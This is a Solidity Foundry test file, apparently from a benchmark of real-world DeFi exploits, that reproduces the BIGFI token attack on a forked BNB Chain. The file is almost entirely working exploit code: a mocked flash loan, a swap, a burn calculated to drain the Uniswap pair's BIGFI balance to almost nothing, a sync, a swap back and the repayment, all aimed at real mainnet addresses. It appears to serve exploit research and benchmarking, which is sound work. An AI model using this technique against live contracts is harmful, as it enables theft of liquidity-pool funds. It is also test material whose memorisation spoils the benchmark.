// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {BEP20USDT} from "@utils/USDT.sol";
import {UniswapV2Pair} from "@uniswapv2/contracts/UniswapV2Pair.sol";
import {UniswapV2Router} from "@uniswapv2/contracts/UniswapV2Router.sol";

import {DxBurnToken} from "benchmarks/realworld/BIGFI/DxBurnToken.sol";

contract BIGFITest is Test {
    DxBurnToken bigfi = DxBurnToken(payable(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB));
    BEP20USDT usdt = BEP20USDT(0x55d398326f99059fF775485246999027B3197955);
    UniswapV2Router router =
        UniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    UniswapV2Pair pair =
        UniswapV2Pair(0xA269556EdC45581F355742e46D2d722c5F3f551a);

    uint256 flashloanAmount = 200_000 * 1e18;
    uint256 paybackAmount = (flashloanAmount * 1000) / (1000 - 3);

    function setUp() public {
        vm.createSelectFork("bsc", 26685503);
        vm.label(address(bigfi), "BIGFI");
        vm.label(address(usdt), "usdt");
        vm.label(address(router), "Router");
        vm.label(address(pair), "Pair");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker usdt balance",
            usdt.balanceOf(address(this)),
            usdt.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker bigfi balance",
            bigfi.balanceOf(address(this)),
            bigfi.decimals()
        );
        emit log_string("");
    }

    function testExploit() external {
        print("Before exploit: ");
        // prepareAction is inferred by AFG
        prepareAction();

        // exploitAction is inferred by SSG
        exploitAction();

        // postAction is inferred by AFG
        postAction();
        print("After exploit: ");
    }

    // prepareAction is inferred by AFG
    function prepareAction() internal {
        // Step 1, mock to flashloan usdt
        deal(address(usdt), address(this), flashloanAmount);

        // Step 2, approve
        usdt.approve(address(router), type(uint256).max);

        // Step 3, swap usdt to get bigfi
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(bigfi);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdt.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function exploitAction() internal {
        // bigfi is a reflakeToken. So we need to calculate the number of burned tokens carefully.
        // Before the exploit: balanceOf(pair) = (_rOwned(pair) * _tTotal / _rTotal)
        // To make: balanceOf(pair)' = n = (_rOwned(pair) * _tTotal' / _rTotal)
        // _tTotal' = n * _rTotal / _rOwned(pair)
        // burnAmount = _tTotal - _tTotal' = _tTotal - n * _rTotal / _rOwned(pair) = _tTotal - (n * _tTotal / balanceOf(pair))
        // Here, 2 is the smallest n which will not cause a revert
        uint256 t = bigfi.totalSupply();
        uint256 burnDiff = (2 * t) / bigfi.balanceOf(address(pair));
        uint256 burnAmount = t - burnDiff;

        // Step 4
        bigfi.burn(burnAmount);

        // Step 5
        pair.sync();
    }

    function postAction() internal {
        // Step 6, approve
        bigfi.approve(address(router), type(uint256).max);

        // Step 7
        address[] memory path = new address[](2);
        path[0] = address(bigfi);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bigfi.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        // Step 8, mock to payback flashloan
        usdt.transfer(address(router), paybackAmount);
    }
}
